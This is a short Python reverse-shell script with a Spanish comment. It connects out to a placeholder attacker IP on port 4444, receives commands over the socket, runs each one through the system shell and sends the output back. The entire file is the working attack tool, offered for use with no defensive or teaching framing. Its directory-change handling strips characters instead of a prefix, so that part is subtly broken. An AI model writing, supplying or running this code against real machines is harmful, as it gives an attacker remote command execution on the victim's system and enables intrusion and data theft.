import socket
import subprocess
import os

def start_reverse_shell(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode()
        if command.lower() == 'exit':
            break
        
        if command.startswith('cd '):
            try:
                os.chdir(command.strip('cd '))
                client.send(b'Changed directory')
            except FileNotFoundError as e:
                client.send(str(e).encode())
        else:
            try:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                client.send(output.stdout.encode() + output.stderr.encode())
            except Exception as e:
                client.send(str(e).encode())

    client.close()

if __name__ == '__main__':
    # Reemplaza 'attacker_ip' con la IP del servidor atacante y 4444 con el puerto usado
    start_reverse_shell('La ip de atacante', 4444)
